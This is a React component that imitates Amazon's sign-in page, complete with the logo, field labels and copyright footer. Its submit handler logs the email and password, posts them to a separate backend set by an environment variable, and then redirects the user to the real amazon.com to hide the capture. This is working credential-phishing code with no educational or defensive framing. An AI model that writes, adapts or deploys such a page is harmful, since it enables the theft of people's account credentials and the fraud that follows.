import React, {Component} from "react";

export default class LoginComponent extends Component {
  constructor(props){
    super(props);
    this.state = {
      username : "",
      password : "",
    }
  }

  handleUsername = (e) => { this.setState({username : e.target.value}) }
  handlePassword = (e) => { this.setState({password : e.target.value}) }

  handleSubmit = () => {
    console.log(this.state.username);
    console.log(this.state.password);

    fetch(`${process.env.REACT_APP_API_URL}/api/login`, {
        method : "POST", 
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          "username": this.state.username,
          "password": this.state.password
        })
      }).then( window.location.replace('https://www.amazon.com/') );
  }

  render(){
    const {username, password} = this.state;
    return(
      <>
        <img src="amazon-logo.png" style = {{width: 103, height: 31, paddingBottom:25, paddingTop:5}}alt="Amazon.com"/>

        <div id="signInBorder">
          <p id="SignInTxt">
            Sign in
          </p>

          <label>
            <strong>Email (phone for mobile accounts)</strong>
            <br />
            <input type="email" name="email" onChange = {this.handleUsername}/>
          </label>

          <br />

          <label>
            <strong>Password</strong>
            <span><a href="#" id="password">Forgot your password?</a></span>
            <br />
            <input type="password" name="password" onChange = {this.handlePassword}/>
          </label>

          <div>
            <button id="amazon" onClick ={this.handleSubmit}>Sign in</button>
          </div>

          <div id="createAccount">
            <h2><span>New to Amazon?</span></h2>
            <button id="newAccount" name="newAcct">Create your Amazon account</button>
          </div>



        </div>

        <hr id="footer" />

        <div className="extra">
          <p className="links"><a href="#" id="first">Conditions of Use</a>
          <a href="#">Notice of Use</a>
          <a href="#">Help</a></p>
          <p className="links" id="special">
            © 1996-2016, Amazon.com, Inc. or its affiliates
          </p>
        </div>
      </>
    );
  }
}